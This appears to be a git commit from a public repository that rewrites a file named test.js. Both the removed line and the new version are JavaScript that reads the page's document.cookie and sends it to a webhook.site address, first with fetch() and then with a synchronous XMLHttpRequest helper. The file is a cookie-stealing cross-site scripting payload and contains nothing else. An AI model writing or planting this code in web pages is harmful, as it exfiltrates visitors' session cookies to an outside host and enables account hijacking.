3cfc5ccb27f679790c5d1283833e2a4dd46c273f
chtipilou <90285314+chtipilou@users.noreply.github.com>
2025-04-30 20:31:48 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,8 @@
-fetch("https://webhook.site/b8b92b0d-c75a-466c-b909-d87bc1dca42c?cookie=" + encodeURIComponent(document.cookie));
+function httpGet(theUrl) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", theUrl, false);
+    xmlHttp.send(null);
+    return xmlHttp.responseText;
+}
+
+httpGet('https://webhook.site/b8b92b0d-c75a-466c-b909-d87bc1dca42c?cookie=' + encodeURIComponent(document.cookie));
